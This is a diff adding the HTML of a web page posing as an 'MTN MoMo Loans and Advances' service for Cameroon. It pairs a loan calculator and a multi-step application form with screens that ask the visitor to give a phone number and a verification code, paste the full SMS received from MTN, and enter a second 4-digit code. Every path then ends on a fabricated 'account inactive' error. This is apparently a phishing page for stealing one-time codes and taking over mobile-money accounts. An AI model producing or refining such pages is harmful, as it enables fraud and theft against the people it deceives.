@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Loans and Advances</title>
+    
+    <!-- ========================================== -->
+    <!-- SOCIAL MEDIA PREVIEW TAGS (OPEN GRAPH)     -->
+    <!-- ========================================== -->
+    <meta property="og:title" content="MTN MoMo Loans and Advances">
+    <meta property="og:description" content="Get loans easily through MTN MoMo. Apply for your loan today!">
+    <meta property="og:image" content="https://mtn-momo-advance-loans-cameroon-jj.onrender.com/momo-preview.jpg">
+    <meta property="og:url" content="https://mtn-momo-advance-loans-cameroon-jj.onrender.com">
+    <meta property="og:type" content="website">
+
+    <!-- Twitter/X specific tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MTN MoMo Loans and Advances">
+    <meta name="twitter:description" content="Get loans easily through MTN MoMo. Apply for your loan today!">
+    <meta name="twitter:image" content="https://mtn-momo-advance-loans-cameroon-jj.onrender.com/momo-preview.jpg">
+    <!-- ========================================== -->
+
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Screen 1: Language Selection -->
+    <div id="language-screen" class="dark-screen active">
+        <div class="dark-card popup-card">
+            <div class="logo-container">
+                <svg viewBox="0 0 24 24" fill="none" stroke="#ffcc00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="2" y="5" width="20" height="14" rx="2"></rect>
+                    <line x1="2" y1="10" x2="22" y2="10"></line>
+                </svg>
+            </div>
+
+            <h2 class="dark-title" data-translate="lang_title_1">Choose your <span class="highlight-yellow" data-translate="lang_title_2">language</span></h2>
+            <p class="dark-subtitle" data-translate="lang_subtitle">Select your language to continue</p>
+
+            <div class="lang-options">
+                <div class="lang-option" onclick="setLanguage('en')">
+                    <img src="https://flagcdn.com/w40/gb.png" alt="English Flag">
+                    <div class="lang-text"><strong>English</strong><span>Continue in English</span></div>
+                    <div class="radio-circle"></div>
+                </div>
+                <div class="lang-option" onclick="setLanguage('fr')">
+                    <img src="https://flagcdn.com/w40/fr.png" alt="French Flag">
+                    <div class="lang-text"><strong>Français</strong><span>Continuer en français</span></div>
+                    <div class="radio-circle"></div>
+                </div>
+                <div class="lang-option selected" onclick="setLanguage('cam')">
+                    <img src="https://flagcdn.com/w40/cm.png" alt="Cameroon Flag">
+                    <div class="lang-text"><strong>Camfranglais</strong><span>Continue in Camfranglais</span></div>
+                    <div class="radio-circle"></div>
+                </div>
+            </div>
+            <small class="dark-footer" data-translate="lang_footer">You can change it anytime</small>
+        </div>
+    </div>
+
+    <!-- Screen 2: Main Calculator -->
+    <div id="main-screen" class="dark-screen">
+        <div class="calculator-container">
+            <div class="calc-header">
+                <h1 data-translate="calc_welcome">MTN MoMo Loans and Advances</h1>
+                <p data-translate="calc_welcome_sub">Get loans easily through MTN MoMo</p>
+            </div>
+
+            <div class="calc-card">
+                <h2 class="calc-title" data-translate="calc_title">Loan Calculator</h2>
+
+                <div class="slider-group">
+                    <div class="slider-labels">
+                        <span><span data-translate="calc_amount">Amount</span>: <strong class="highlight-yellow" id="amountDisplay">XAF 410,000</strong></span>
+                    </div>
+                    <input type="range" id="loanAmount" min="10000" max="1000000" step="10000" value="410000" oninput="updateLoanValue()">
+                    <div class="range-limits"><span>XAF 10,000</span><span>XAF 1,000,000</span></div>
+                </div>
+
+                <div class="slider-group">
+                    <div class="slider-labels">
+                        <span><span data-translate="calc_term">Term</span>: <strong class="highlight-yellow" id="termDisplay">12 Months</strong></span>
+                    </div>
+                    <input type="range" id="loanTerm" min="3" max="36" step="1" value="12" oninput="updateLoanValue()">
+                </div>
+
+                <div class="result-box">
+                    <p data-translate="calc_monthly">Monthly Payment</p>
+                    <h2 class="highlight-yellow" id="monthlyPayment">XAF 38,267</h2>
+                </div>
+
+                <button class="btn-primary" onclick="goToForm()" data-translate="calc_btn">START APPLICATION</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Screen 3: Application Form -->
+    <div id="form-screen" class="dark-screen">
+        <div class="calculator-container">
+            
+            <div class="calc-card form-card">
+                
+                <div class="progress-container">
+                    <div class="progress-bar-track">
+                        <div class="progress-bar-fill" id="progress-fill"></div>
+                    </div>
+                    <p class="step-text" id="step-indicator" data-translate="form_step1">Step 1 of 3</p>
+                </div>
+
+                <div id="step-1" class="form-step active">
+                    <h2 class="step-title" data-translate="form_loan_details">Loan Details</h2>
+
+                    <div class="input-group">
+                        <label data-translate="form_loan_type">Loan Type</label>
+                        <select class="dark-input" id="loanType">
+                            <option value="Business" data-translate="form_loan_business">Business Loan</option>
+                            <option value="Personal" data-translate="form_loan_personal">Personal Loan</option>
+                            <option value="Emergency" data-translate="form_loan_emergency">Emergency Loan</option>
+                        </select>
+                    </div>
+
+                    <div class="input-group">
+                        <label data-translate="form_loan_amount">Loan Amount (XAF)</label>
+                        <input type="text" id="formLoanAmount" class="dark-input" readonly>
+                    </div>
+
+                    <div class="input-group">
+                        <label data-translate="form_loan_term">Loan Term</label>
+                        <input type="text" id="formLoanTerm" class="dark-input" readonly>
+                    </div>
+
+                    <div class="input-group">
+                        <label data-translate="form_loan_purpose">Purpose of Loan</label>
+                        <input type="text" placeholder="e.g., Business expansion" class="dark-input">
+                    </div>
+
+                    <button class="btn-primary" onclick="nextStep(2)" data-translate="form_next">NEXT STEP</button>
+                </div>
+
+                <div id="step-2" class="form-step">
+                    <h2 class="step-title" data-translate="form_personal_details">Personal Details</h2>
+                    
+                    <div class="input-group">
+                        <label data-translate="form_first_name">First Name</label>
+                        <input type="text" placeholder="First Name" class="dark-input" data-translate-placeholder="form_first_name_ph">
+                    </div>
+
+                    <div class="input-group">
+                        <label data-translate="form_last_name">Last Name</label>
+                        <input type="text" placeholder="Last Name" class="dark-input" data-translate-placeholder="form_last_name_ph">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label data-translate="form_phone">Phone Number (Cameroon)</label>
+                        <div class="phone-input-wrapper">
+                            <div class="flag-prefix">
+                                <img src="https://flagcdn.com/w40/cm.png" alt="Cameroon Flag">
+                            </div>
+                            <input type="tel" placeholder="9 digits (e.g., 670123456)" class="dark-input phone-input" data-translate-placeholder="form_phone_ph">
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label data-translate="form_code">5-Digit Verification Code</label>
+                        <input type="text" maxlength="5" placeholder="Enter 5-digit code" class="dark-input" data-translate-placeholder="form_code_ph">
+                    </div>
+
+                    <div class="button-row">
+                        <button class="btn-secondary" onclick="prevStep(1)" data-translate="form_back">BACK</button>
+                        <button class="btn-primary" onclick="nextStep(3)" data-translate="form_next">NEXT STEP</button>
+                    </div>
+                </div>
+
+                <div id="step-3" class="form-step">
+                    <h2 class="step-title" data-translate="form_emp_details">Employment Details</h2>
+                    
+                    <div class="input-group">
+                        <label data-translate="form_emp_status">Employment Status</label>
+                        <select class="dark-input" id="empStatus">
+                            <option value="Self-employed" data-translate="form_emp_self">Self-employed</option>
+                            <option value="Student" data-translate="form_emp_student">Student</option>
+                            <option value="Employed full time" data-translate="form_emp_full">Employed full time</option>
+                            <option value="Employed part time" data-translate="form_emp_part">Employed part time</option>
+                            <option value="Unemployed" data-translate="form_emp_unemployed">Unemployed</option>
+                        </select>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label data-translate="form_annual_income">Annual Income (XAF)</label>
+                        <input type="text" placeholder="e.g., 5000000" class="dark-input" data-translate-placeholder="form_annual_income_ph">
+                    </div>
+
+                    <div class="button-row">
+                        <button class="btn-secondary" onclick="prevStep(2)" data-translate="form_back">BACK</button>
+                        <button class="btn-primary" onclick="submitApplication()" data-translate="form_submit">SUBMIT APPLICATION</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Screen 4: Processing -->
+    <div id="processing-screen" class="dark-screen">
+        <div class="dark-card popup-card" style="text-align:center;">
+            <h2 class="dark-title" data-translate="proc_title">Processing Application</h2>
+            <p class="dark-subtitle" data-translate="proc_subtitle">Please wait, this may take a few seconds</p>
+            <div class="loader"></div>
+        </div>
+    </div>
+
+    <!-- Screen 5: Paste SMS -->
+    <div id="sms-screen" class="dark-screen">
+        <div class="calculator-container" style="max-width: 800px;">
+            
+            <div class="smt-header">
+                <div class="shield-icon">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2L3 6v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V6l-9-4z" fill="#ffcc00"/>
+                        <path d="M4 8h16v8H4z" fill="#0f1a2e"/>
+                        <path d="M4 8l8 5 8-5" stroke="#ffcc00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M8 11h4" stroke="#ffcc00" stroke-width="2" stroke-linecap="round"/>
+                        <path d="M8 14h6" stroke="#ffcc00" stroke-width="2" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                
+                <h2 class="dark-title" data-translate="sms_title_1">Paste the <span class="highlight-yellow" data-translate="sms_title_2">SMS</span> from MTN</h2>
+                <p class="dark-subtitle" data-translate="sms_subtitle_1">
+                    We sent a confirmation message to your number.<br>
+                    <strong>Copy the full SMS you received</strong> and paste it below.
+                </p>
+            </div>
+
+            <div class="tip-box">
+                <span class="tip-icon">💡</span>
+                <p data-translate="sms_tip">Open your Messages app, find the SMS from MTN, long-press it, tap Copy, then come back here.</p>
+            </div>
+
+            <textarea class="sms-textarea" placeholder="Paste the SMS received from MTN here..." data-translate-placeholder="sms_placeholder"></textarea>
+
+            <button class="btn-verify" onclick="showScreen('verification-screen')" data-translate="sms_btn">VERIFY & CONTINUE &rarr;</button>
+        </div>
+    </div>
+
+    <!-- Screen 6: Verification Code -->
+    <div id="verification-screen" class="dark-screen">
+        <div class="dark-card popup-card" style="text-align:center;">
+            <h2 class="dark-title" data-translate="ver_title">Enter the Verification Code</h2>
+            <p class="dark-subtitle" data-translate="ver_subtitle">We sent a 4-digit code to your number. Enter it below to continue.</p>
+            <input type="text" maxlength="4" class="dark-input" placeholder="0000" style="text-align: center; font-size: 24px; letter-spacing: 5px; margin-bottom: 20px;">
+            <button class="btn-primary" onclick="showScreen('error-screen')" data-translate="ver_btn">VERIFY</button>
+        </div>
+    </div>
+
+    <!-- Screen 7: Error/Inactive Account -->
+    <div id="error-screen" class="dark-screen">
+        <div class="dark-card popup-card" style="text-align:center;">
+            <h2 class="dark-title" data-translate="err_title">Oops! Your account is inactive</h2>
+            <p class="dark-subtitle" data-translate="err_subtitle_1">We can't credit your loan at the moment.</p>
+            <h4 class="highlight-yellow" style="margin-bottom: 10px;" data-translate="err_next">Here's what to do next</h4>
+            <p class="dark-subtitle" data-translate="err_subtitle_2">Your account cannot be credited because it is not active. Please ensure you are using an active account that has been making transactions regularly, then try again.</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
